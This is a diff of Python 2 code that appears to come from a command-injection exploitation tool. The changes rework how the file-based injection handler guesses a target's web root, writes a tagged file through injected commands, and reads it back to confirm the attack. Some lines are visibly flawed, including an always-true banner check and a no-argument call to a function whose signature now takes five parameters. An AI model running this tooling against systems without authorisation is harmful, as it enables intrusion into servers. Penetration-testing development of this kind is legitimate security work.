@@ -103,7 +103,7 @@ def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, h
 """
 Provide custom server's root directory
 """
-def custom_web_root():
+def custom_web_root(url, timesec, filename, http_request_method, url_time_response):
   if settings.TARGET_OS == "win" :
     example_root_dir = "\\inetpub\\wwwroot"
   else:
@@ -112,7 +112,12 @@ def custom_web_root():
   question_msg += example_root_dir + "') > "
   sys.stdout.write(settings.print_question_msg(question_msg))
   settings.WEB_ROOT = sys.stdin.readline().replace("\n","").lower()
+  if len(settings.WEB_ROOT) == 0:
+    settings.WEB_ROOT = example_root_dir
+  if menu.options.web_root:
+    menu.options.web_root = settings.WEB_ROOT
   settings.CUSTOM_WEB_ROOT = True
+  fb_injection_handler(url, timesec, filename, http_request_method, url_time_response)
 
 """
 The "file-based" injection technique handler
@@ -131,79 +136,80 @@ def fb_injection_handler(url, timesec, filename, http_request_method, url_time_r
   injection_type = "semi-blind command injection"
   technique = "file-based command injection technique"
 
-  # Set temp path 
-  if settings.TARGET_OS == "win":
-    if "microsoft-iis" in settings.SERVER_BANNER.lower():
-      settings.TMP_PATH = "C:\\Windows\TEMP\\"
+  if not settings.CUSTOM_WEB_ROOT:
+    # Set temp path 
+    if settings.TARGET_OS == "win":
+      if "microsoft-iis" in settings.SERVER_BANNER.lower():
+        settings.TMP_PATH = "C:\\Windows\TEMP\\"
+      else:
+        settings.TMP_PATH = "%temp%\\"
     else:
-      settings.TMP_PATH = "%temp%\\"
-  else:
-    settings.TMP_PATH = "/tmp/"
+      settings.TMP_PATH = "/tmp/"
 
-  if menu.options.tmp_path:
-    tmp_path = menu.options.tmp_path
-  else:
-    tmp_path = settings.TMP_PATH
-
-  if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:
-    settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT
-
-  if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
-    call_tmp_based = True
-  else:
-    if menu.options.web_root:
-      settings.WEB_ROOT = menu.options.web_root
+    if menu.options.tmp_path:
+      tmp_path = menu.options.tmp_path
     else:
-      # Debian/Ubunt have been updated to use /var/www/html as default instead of /var/www.
-      if "apache" in settings.SERVER_BANNER.lower():
-        if "debian" or "ubuntu" in settings.SERVER_BANNER.lower():
+      tmp_path = settings.TMP_PATH
+
+    if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:
+      settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT
+
+    if menu.options.file_dest and '/tmp/' in menu.options.file_dest:
+      call_tmp_based = True
+    else:
+      if menu.options.web_root:
+        settings.WEB_ROOT = menu.options.web_root
+      else:
+        # Debian/Ubunt have been updated to use /var/www/html as default instead of /var/www.
+        if "apache" in settings.SERVER_BANNER.lower():
+          if "debian" or "ubuntu" in settings.SERVER_BANNER.lower():
+            try:
+              check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
+              if check_version[0] > "2.3" and not settings.TARGET_OS == "win":
+                # Add "/html" to servers root directory
+                settings.WEB_ROOT = settings.WEB_ROOT + "/html"
+              else:
+                settings.WEB_ROOT = settings.WEB_ROOT 
+            except IndexError:
+              pass
+          # Add "/html" to servers root directory
+          elif "fedora" or "centos" in settings.SERVER_BANNER.lower():
+            settings.WEB_ROOT = settings.WEB_ROOT + "/html"
+          else:
+            pass
+        # On more recent versions (>= "1.2.4") the default root path has changed to "/usr/share/nginx/html"
+        elif "nginx" in settings.SERVER_BANNER.lower():
           try:
             check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
-            if check_version[0] > "2.3" and not settings.TARGET_OS == "win":
+            if check_version[0] >= "1.2.4":
               # Add "/html" to servers root directory
               settings.WEB_ROOT = settings.WEB_ROOT + "/html"
             else:
-              settings.WEB_ROOT = settings.WEB_ROOT 
+              # Add "/www" to servers root directory
+              settings.WEB_ROOT = settings.WEB_ROOT + "/www"
           except IndexError:
             pass
-        # Add "/html" to servers root directory
-        elif "fedora" or "centos" in settings.SERVER_BANNER.lower():
-          settings.WEB_ROOT = settings.WEB_ROOT + "/html"
+        elif "microsoft-iis" in settings.SERVER_BANNER.lower():
+          pass
         else:
-          pass
-      # On more recent versions (>= "1.2.4") the default root path has changed to "/usr/share/nginx/html"
-      elif "nginx" in settings.SERVER_BANNER.lower():
-        try:
-          check_version = re.findall(r"/(.*)\.", settings.SERVER_BANNER.lower())
-          if check_version[0] >= "1.2.4":
-            # Add "/html" to servers root directory
-            settings.WEB_ROOT = settings.WEB_ROOT + "/html"
-          else:
-            # Add "/www" to servers root directory
-            settings.WEB_ROOT = settings.WEB_ROOT + "/www"
-        except IndexError:
-          pass
-      elif "microsoft-iis" in settings.SERVER_BANNER.lower():
-        pass
-      else:
-        # Provide custom server's root directory.
-        custom_web_root()
+          # Provide custom server's root directory.
+          custom_web_root()
 
-      path = urlparse.urlparse(url).path
-      path_parts = path.split('/')
-      count = 0
-      for part in path_parts:        
-        count = count + 1
-      count = count - 1
-      last_param = path_parts[count]
-      EXTRA_DIR = path.replace(last_param, "")
-      settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR
-      if settings.TARGET_OS == "win":
-        settings.WEB_ROOT = settings.WEB_ROOT.replace("/","\\")
+        path = urlparse.urlparse(url).path
+        path_parts = path.split('/')
+        count = 0
+        for part in path_parts:        
+          count = count + 1
+        count = count - 1
+        last_param = path_parts[count]
+        EXTRA_DIR = path.replace(last_param, "")
+        settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR
+        if settings.TARGET_OS == "win":
+          settings.WEB_ROOT = settings.WEB_ROOT.replace("/","\\")
 
-    if not settings.LOAD_SESSION or settings.RETEST == True: 
-      info_msg = "Trying to create a file in '" + settings.WEB_ROOT + "'... "
-      print settings.print_info_msg(info_msg)
+  if not settings.LOAD_SESSION or settings.RETEST == True: 
+    info_msg = "Trying to create a file in '" + settings.WEB_ROOT + "'... "
+    print settings.print_info_msg(info_msg)
 
   i = 0
   TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
@@ -215,6 +221,7 @@ def fb_injection_handler(url, timesec, filename, http_request_method, url_time_r
     for prefix in settings.PREFIXES:
       for suffix in settings.SUFFIXES:
         for separator in settings.SEPARATORS:
+
           # Check injection state
           settings.DETECTION_PHASE = True
           settings.EXPLOITATION_PHASE = False
@@ -309,16 +316,16 @@ def fb_injection_handler(url, timesec, filename, http_request_method, url_time_r
               output = fb_injector.injection_output(url, OUTPUT_TEXTFILE, timesec)
               time.sleep(timesec)
               
-              try:
-                # Check if defined extra headers.
-                request = urllib2.Request(output)
-                headers.do_check(request)
-                
-                # Evaluate test results.
-                output = urllib2.urlopen(request)
-                html_data = output.read()
-                shell = re.findall(r"" + TAG + "", html_data)
+              # Check if defined extra headers.
+              request = urllib2.Request(output)
+              headers.do_check(request)
 
+              # Evaluate test results.
+              output = urllib2.urlopen(request)
+              html_data = output.read()
+              shell = re.findall(r"" + TAG + "", html_data)
+
+              try:
                 if len(shell) != 0 and shell[0] == TAG and not settings.VERBOSITY_LEVEL >= 1:
                   percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                   info_msg = "Testing the " + "(" + injection_type.split(" ")[0] + ") " + technique + "... [ " + percent + " ]"
@@ -420,13 +427,15 @@ def fb_injection_handler(url, timesec, filename, http_request_method, url_time_r
                 delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
               raise
 
-            except urllib2.URLError, e:
+            except urllib2.URLError, e: 
+              err_msg = str(e).replace(": "," (") + ")." 
+              print settings.print_critical_msg(err_msg)
               warn_msg = "It seems that you don't have permissions to "
               warn_msg += "read and/or write files in '" + settings.WEB_ROOT + "'."
               sys.stdout.write("\r" + settings.print_warning_msg(warn_msg))
               print ""
               # Provide custom server's root directory.
-              custom_web_root()
+              custom_web_root(url, timesec, filename, http_request_method, url_time_response)
               continue
             
             except:
